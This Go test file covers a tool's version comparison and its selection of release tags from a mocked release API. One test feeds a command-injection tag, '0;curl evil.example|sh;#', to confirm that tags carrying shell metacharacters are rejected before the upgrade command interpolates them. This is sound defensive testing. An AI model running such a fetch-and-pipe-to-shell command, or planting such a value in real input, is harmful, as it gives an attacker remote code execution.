package release

import (
	"context"
	"net/http"
	"net/http/httptest"
	"testing"
)

func TestIsNewer(t *testing.T) {
	cases := []struct {
		latest, current string
		want            bool
	}{
		{"0.5.4", "0.5.3", true},
		{"0.5.3", "0.5.3", false},
		{"0.5.3", "0.5.4", false},
		{"1.0.0", "0.9.9", true},
		{"0.6.0", "0.5.9", true},
		{"0.5.10", "0.5.9", true},    // numeric, not lexical, compare
		{"v0.5.4", "0.5.3", true},    // tolerates a stray "v"
		{"0.5.4", "dev", false},      // unreleased current -> no notice
		{"dev", "0.5.3", false},      // unparseable latest -> no notice
		{"0.5.4-rc1", "0.5.3", true}, // pre-release suffix ignored
		{"0.5", "0.5.3", false},      // not three parts -> no notice
		{"", "0.5.3", false},
	}
	for _, c := range cases {
		if got := IsNewer(c.latest, c.current); got != c.want {
			t.Errorf("IsNewer(%q, %q) = %v, want %v", c.latest, c.current, got, c.want)
		}
	}
}

// withAPIURL points apiURL at a test server for the duration of the test.
func withAPIURL(t *testing.T, body string, status int) {
	t.Helper()
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if status != http.StatusOK {
			w.WriteHeader(status)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte(body))
	}))
	old := apiURL
	apiURL = srv.URL
	t.Cleanup(func() {
		apiURL = old
		srv.Close()
	})
}

func TestLatestPicksNewestBareTag(t *testing.T) {
	// Newest first; the "porta-v*" desktop tag must be skipped.
	withAPIURL(t, `[
		{"tag_name": "porta-v1.2.0"},
		{"tag_name": "0.5.4"},
		{"tag_name": "0.5.3"}
	]`, http.StatusOK)

	got, err := Latest(context.Background())
	if err != nil {
		t.Fatalf("Latest returned error: %v", err)
	}
	if got != "0.5.4" {
		t.Errorf("Latest = %q, want %q", got, "0.5.4")
	}
}

func TestLatestSkipsLegacyV(t *testing.T) {
	withAPIURL(t, `[{"tag_name": "v0.4.0"}, {"tag_name": "0.5.4"}]`, http.StatusOK)

	got, err := Latest(context.Background())
	if err != nil {
		t.Fatalf("Latest returned error: %v", err)
	}
	if got != "0.5.4" {
		t.Errorf("Latest = %q, want %q (legacy v* tag should be skipped)", got, "0.5.4")
	}
}

func TestLatestNon200(t *testing.T) {
	withAPIURL(t, "", http.StatusForbidden)

	if _, err := Latest(context.Background()); err == nil {
		t.Error("Latest should return an error on a non-200 response")
	}
}

func TestLatestNoReleases(t *testing.T) {
	withAPIURL(t, `[{"tag_name": "porta-v1.0.0"}]`, http.StatusOK)

	if _, err := Latest(context.Background()); err == nil {
		t.Error("Latest should return an error when no bare-semver release exists")
	}
}

// `cyfr upgrade` interpolates the tag into a shell command line, so a tag
// that is not plain MAJOR.MINOR.PATCH must never be selected.
func TestLatestRejectsShellMetacharacters(t *testing.T) {
	withAPIURL(t, `[
		{"tag_name": "0;curl evil.example|sh;#"},
		{"tag_name": "0.5.4-rc1"},
		{"tag_name": "0.5.4 "},
		{"tag_name": "0.5.4"}
	]`, http.StatusOK)

	got, err := Latest(context.Background())
	if err != nil {
		t.Fatalf("Latest returned error: %v", err)
	}
	if got != "0.5.4" {
		t.Errorf("Latest = %q, want %q", got, "0.5.4")
	}
}
